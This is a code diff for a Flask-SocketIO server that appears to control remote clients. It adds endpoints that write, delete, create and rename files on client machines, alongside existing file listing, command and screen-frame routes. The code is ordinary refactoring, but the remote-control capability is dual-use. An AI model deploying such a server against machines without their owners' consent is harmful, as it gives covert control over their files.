@@ -210,18 +210,12 @@ pending_fs_requests = {}
 
 
 @socketio.on("fs_list_res")
-def handle_fs_list_res(data):
-    if not isinstance(data, dict):
-        return
-    req_id = data.get("req_id")
-    entry = pending_fs_requests.get(req_id)
-    if entry:
-        entry["result"] = data.get("payload")
-        entry["event"].set()
-
-
 @socketio.on("fs_read_res")
-def handle_fs_read_res(data):
+@socketio.on("fs_write_res")
+@socketio.on("fs_delete_res")
+@socketio.on("fs_mkdir_res")
+@socketio.on("fs_rename_res")
+def handle_fs_response(data):
     if not isinstance(data, dict):
         return
     req_id = data.get("req_id")
@@ -393,13 +387,7 @@ def set_command():
 # ── File System / FTP Browser Routes ──
 
 
-@app.post("/api/fs/list")
-@require_password
-def fs_list():
-    data = request.get_json(silent=True) or {}
-    username = data.get("username")
-    path = data.get("path", "drives")
-
+def dispatch_fs_request(username, event_name, payload, timeout=10):
     if not username or not is_safe_name(username):
         return jsonify({"error": "Missing or invalid username"}), 400
 
@@ -410,41 +398,104 @@ def fs_list():
     event = threading.Event()
     pending_fs_requests[req_id] = {"event": event, "result": None}
 
-    socketio.emit("fs_list_req", {"req_id": req_id, "path": path}, room=username)
+    req_payload = {"req_id": req_id, **payload}
+    socketio.emit(event_name, req_payload, room=username)
 
-    if event.wait(timeout=8):
+    if event.wait(timeout=timeout):
         res = pending_fs_requests.pop(req_id, {}).get("result")
         return jsonify(res or {"error": "No response payload"})
     else:
         pending_fs_requests.pop(req_id, None)
-        return jsonify({"error": "File browsing request timed out"}), 504
+        return jsonify({"error": f"Request {event_name} timed out"}), 504
+
+
+@app.post("/api/fs/list")
+@require_password
+def fs_list():
+    data = request.get_json(silent=True) or {}
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_list_req",
+        {"path": data.get("path", "drives")},
+        timeout=8,
+    )
 
 
 @app.post("/api/fs/read")
 @require_password
 def fs_read():
     data = request.get_json(silent=True) or {}
-    username = data.get("username")
-    path = data.get("path")
+    if not data.get("path"):
+        return jsonify({"error": "Missing path parameter"}), 400
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_read_req",
+        {"path": data.get("path")},
+        timeout=10,
+    )
 
-    if not username or not is_safe_name(username) or not path:
-        return jsonify({"error": "Missing required parameters"}), 400
 
-    if username not in active_clients.values():
-        return jsonify({"error": "Client is currently offline"}), 404
+@app.post("/api/fs/write")
+@require_password
+def fs_write():
+    data = request.get_json(silent=True) or {}
+    if not data.get("path"):
+        return jsonify({"error": "Missing path parameter"}), 400
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_write_req",
+        {
+            "path": data.get("path"),
+            "content": data.get("content", ""),
+            "is_base64": bool(data.get("is_base64", False)),
+        },
+        timeout=15,
+    )
 
-    req_id = str(uuid.uuid4())
-    event = threading.Event()
-    pending_fs_requests[req_id] = {"event": event, "result": None}
 
-    socketio.emit("fs_read_req", {"req_id": req_id, "path": path}, room=username)
+@app.post("/api/fs/delete")
+@require_password
+def fs_delete():
+    data = request.get_json(silent=True) or {}
+    if not data.get("path"):
+        return jsonify({"error": "Missing path parameter"}), 400
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_delete_req",
+        {"path": data.get("path")},
+        timeout=10,
+    )
 
-    if event.wait(timeout=10):
-        res = pending_fs_requests.pop(req_id, {}).get("result")
-        return jsonify(res or {"error": "No response payload"})
-    else:
-        pending_fs_requests.pop(req_id, None)
-        return jsonify({"error": "File read request timed out"}), 504
+
+@app.post("/api/fs/mkdir")
+@require_password
+def fs_mkdir():
+    data = request.get_json(silent=True) or {}
+    if not data.get("path"):
+        return jsonify({"error": "Missing path parameter"}), 400
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_mkdir_req",
+        {"path": data.get("path")},
+        timeout=10,
+    )
+
+
+@app.post("/api/fs/rename")
+@require_password
+def fs_rename():
+    data = request.get_json(silent=True) or {}
+    if not data.get("old_path") or not data.get("new_path"):
+        return jsonify({"error": "Missing old_path or new_path parameter"}), 400
+    return dispatch_fs_request(
+        data.get("username"),
+        "fs_rename_req",
+        {
+            "old_path": data.get("old_path"),
+            "new_path": data.get("new_path"),
+        },
+        timeout=10,
+    )
 
 
 @app.get("/frames/<username>/<filename>")
